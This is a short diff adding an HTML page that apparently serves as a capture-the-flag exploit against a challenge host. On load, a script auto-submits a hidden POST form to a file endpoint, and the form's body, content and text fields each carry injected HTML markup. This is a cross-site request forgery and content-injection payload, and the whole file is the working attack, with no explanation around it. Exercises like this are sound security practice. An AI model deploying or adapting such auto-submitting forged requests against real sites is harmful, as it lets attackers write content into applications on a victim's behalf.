@@ -1,0 +1,11 @@
+<!doctype html>
+<html>
+<body>
+<form id="f" action="http://k06749d7511f8df4bb76c71a2393a43af.playat.flagyard.com/?p=view&dir=docs/&file=xssfile" method="POST">
+<input type="text" name="body" value="<h1>injected</h1>">
+<input type="text" name="content" value="<h1>injected</h1>">
+<input type="text" name="text" value="<h1>injected</h1>">
+</form>
+<script>document.getElementById('f').submit();</script>
+</body>
+</html>
